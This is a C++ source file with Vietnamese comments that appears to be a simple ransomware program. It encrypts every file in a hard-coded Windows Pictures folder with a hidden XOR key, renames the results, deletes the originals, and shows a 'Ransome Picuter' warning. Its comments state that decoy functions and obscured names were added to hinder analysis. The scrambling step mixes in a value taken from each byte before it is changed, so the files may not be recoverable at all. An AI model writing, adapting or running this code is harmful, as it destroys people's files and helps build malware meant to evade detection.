#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <filesystem>
#include <windows.h>
#include <sstream>
#include <iomanip>
#include <random>
#include <chrono>
#include <algorithm>
#include <functional>
#include <map>

namespace fs = std::filesystem;

// Khóa mã hóa đơn giản
std::string _ds_k()
{
    std::string k = "";
    std::vector<int> v = {82, 65, 78, 83, 79, 77, 69, 75, 69, 89, 49, 50, 51, 52, 53, 54, 55, 56, 57};
    for (int c : v)
        k += static_cast<char>(c);
    return k;
}

// Mã hóa chuỗi đơn giản
std::string o_str(const std::string &input)
{
    std::string out = input;
    for (size_t i = 0; i < out.size(); ++i)
    {
        out[i] = out[i] ^ 0x5A;
    }
    return out;
}

// Giải mã chuỗi
std::string d_str(const std::string &input)
{
    return o_str(input);
}

// Hàm tạo mã hash đơn giản từ string
std::string calc_file_id(const std::string &input)
{
    // Tạo hash thực sự
    std::stringstream ss;
    size_t hash = 0;

    // Tạo hash đơn giản bằng cách kết hợp các ký tự trong chuỗi
    for (char c : input)
    {
        hash = ((hash << 5) + hash) + c;
    }

    // Thêm timestamp để tạo tính độc đáo
    auto now = std::chrono::system_clock::now();
    auto duration = now.time_since_epoch();
    auto millis = std::chrono::duration_cast<std::chrono::milliseconds>(duration).count();

    ss << std::hex << std::setfill('0') << std::setw(8) << hash;
    ss << std::hex << std::setfill('0') << std::setw(8) << millis;

    return ss.str();
}

// Hàm transformation đơn giản
void transform_data(std::vector<char> &buffer, const std::string &key)
{
    std::vector<int> offsets;
    for (size_t i = 0; i < 256; ++i)
    {
        offsets.push_back(i * i % 256);
    }

    for (size_t i = 0; i < buffer.size(); ++i)
    {
        char k = key[i % key.size()];
        int offset = offsets[static_cast<unsigned char>(buffer[i]) % offsets.size()];
        buffer[i] = buffer[i] ^ k ^ static_cast<char>(offset & 0xFF);
    }
}

// Hàm mã hóa file
bool process_file(const fs::path &file_path)
{
    try
    {
        // Tạo file buffer để đọc dữ liệu
        std::ifstream input_file(file_path, std::ios::binary);
        if (!input_file)
        {
            std::cerr << "Cannot open file: " << file_path << std::endl;
            return false;
        }

        // Đọc file vào buffer
        std::vector<char> data_buffer(std::istreambuf_iterator<char>(input_file), {});
        input_file.close();

        // Mã hóa dữ liệu
        transform_data(data_buffer, _ds_k());

        // Tạo tên file mới
        std::string file_id = calc_file_id(file_path.string());
        fs::path output_path = file_path.parent_path() / file_id;

        // Ghi dữ liệu đã mã hóa
        std::ofstream output_file(output_path, std::ios::binary);
        if (!output_file)
        {
            std::cerr << "Cannot create output file: " << output_path << std::endl;
            return false;
        }

        output_file.write(data_buffer.data(), data_buffer.size());
        output_file.close();

        // Xóa file gốc
        fs::remove(file_path);

        return true;
    }
    catch (const std::exception &e)
    {
        std::cerr << "Error processing file " << file_path << ": " << e.what() << std::endl;
        return false;
    }
}

// Thêm một số hàm dummy không bao giờ được gọi để làm nhiễu phân tích
void dummy_func1()
{
    std::ofstream file("normal_log.txt");
    file << "System check completed" << std::endl;
    file.close();
}

void dummy_func2()
{
    std::vector<int> numbers;
    for (int i = 0; i < 1000; ++i)
    {
        numbers.push_back(rand() % 1000);
    }
    std::sort(numbers.begin(), numbers.end());
}

void dummy_func3()
{
    std::map<std::string, int> data;
    data["windows"] = 1;
    data["update"] = 2;
    data["service"] = 3;
}

// Hàm main bị obfuscated
int main()
{
    // Tạo tên biến không rõ ràng
    std::string s_path = "C:\\Users\\a\\Pictures\\Saved Pictures";
    int c_proc = 0;

    try
    {
        // Kiểm tra thư mục
        if (fs::exists(s_path) && fs::is_directory(s_path))
        {
            // Tất cả các file trong thư mục
            std::vector<fs::path> all_files;
            for (const auto &entry : fs::directory_iterator(s_path))
            {
                if (fs::is_regular_file(entry.path()))
                {
                    all_files.push_back(entry.path());
                }
            }

            // Thêm dummy operation để làm nhiễu phân tích
            std::random_device rd;
            std::mt19937 g(rd());
            std::shuffle(all_files.begin(), all_files.end(), g);

            // Xử lý các file
            for (const auto &f : all_files)
            {
                if (process_file(f))
                {
                    c_proc++;
                }
            }

            std::cout << "Processed " << c_proc << " files." << std::endl;
        }
        else
        {
            std::cerr << "Directory not accessible" << std::endl;
        }
    }
    catch (const std::exception &e)
    {
        std::cerr << "Error: " << e.what() << std::endl;
    }

    // Hiển thị thông báo
    MessageBoxA(NULL, "Ransome Picuter", "Warning", MB_ICONWARNING | MB_OK);

    return 0;
}